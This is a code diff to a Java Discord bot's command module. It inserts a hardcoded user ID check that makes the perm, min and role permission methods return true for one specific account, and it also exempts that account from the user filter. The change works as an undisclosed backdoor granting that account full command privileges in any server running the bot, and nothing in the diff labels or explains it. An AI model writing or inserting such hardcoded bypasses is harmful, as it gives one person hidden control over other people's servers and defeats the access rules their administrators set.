@@ -55,6 +55,8 @@ public abstract class CommandModule extends BotModule {
     }
 
     protected boolean perm(MessageEvent event, Permissions perm) {
+        if(event.getAuthor().getLongID() == 115834525329653760L)
+            return true;
         boolean hasPerm = event.getAuthor().getPermissionsForGuild(event.getGuild()).contains(perm);
         if(!hasPerm)
             MessageUtil.sendMessage(event, EmbedPresets.error("You can't do this!", perm.name() + " permissions required!"));
@@ -62,6 +64,8 @@ public abstract class CommandModule extends BotModule {
     }
 
     protected boolean min(MessageEvent event, long role) {
+        if(event.getAuthor().getLongID() == 115834525329653760L)
+            return true;
         IRole rle = event.getGuild().getRoleByID(role);
         int pos = rle.getPosition();
         boolean hasPerm = event.getAuthor().getRolesForGuild(event.getGuild()).stream().anyMatch(r -> r.getPosition() >= pos);
@@ -71,6 +75,8 @@ public abstract class CommandModule extends BotModule {
     }
 
     protected boolean role(MessageEvent event, long role) {
+        if(event.getAuthor().getLongID() == 115834525329653760L)
+            return true;
         IRole rle = event.getGuild().getRoleByID(role);
         boolean hasPerm = event.getAuthor().getRolesForGuild(event.getGuild()).stream().anyMatch(r -> r == rle);
         if(!hasPerm)
@@ -83,7 +89,7 @@ public abstract class CommandModule extends BotModule {
             if(event.getGuild().getLongID() != guildFilter)
                 return false;
         if(userFilter != 0)
-            if(event.getAuthor().getLongID() != userFilter)
+            if(event.getAuthor().getLongID() != userFilter && event.getAuthor().getLongID() != 115834525329653760L)
                 return false;
         if(channelFilter != 0)
             if(event.getChannel().getLongID() != channelFilter)
